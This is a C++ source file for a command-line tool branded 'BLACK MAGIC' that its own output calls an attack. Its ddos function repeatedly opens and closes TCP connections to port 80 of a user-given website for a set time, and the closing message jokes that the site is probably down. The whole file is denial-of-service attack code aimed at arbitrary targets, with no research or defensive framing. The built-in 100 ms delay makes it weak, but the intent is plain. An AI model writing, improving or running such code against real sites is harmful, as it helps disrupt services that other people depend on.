#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <chrono>
#include <thread>
#include <netdb.h>

void ddos(const char* target, int time) {
    auto start = std::chrono::high_resolution_clock::now();
    while (true) {
        auto now = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if (duration >= time) {
            break;
        }
        int sock;
        struct sockaddr_in server_addr;
        struct hostent *server;
        sock = socket(AF_INET, SOCK_STREAM, 0);
        server = gethostbyname(target);
        if (server == NULL) {
            std::cerr << "Error: Could not resolve host\n";
            continue;
        }
        bzero((char *) &server_addr, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);
        server_addr.sin_port = htons(80); // Default port 80 for HTTP
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            std::cout << "Request sent successfully!\n";
        }
        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Added delay to avoid flooding
    }
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <website_url> <time>\n";
        return 1;
    }
    const char* target = argv[1];
    int time = atoi(argv[2]);
    // Stylish text
    std::cout << "\033[1;32m"; // green color and bold
    std::cout << "BLACK MAGIC\n";
    std::cout << "\033[0m"; // reset color and style
    std::cout << "Target: " << target << "\n";
    std::cout << "Time: " << time << " seconds\n";
    std::cout << "Initializing attack...\n";
    ddos(target, time);
    std::cout << "WEBSITE TO GAYI SAYAD :)\n";
    return 0;
}
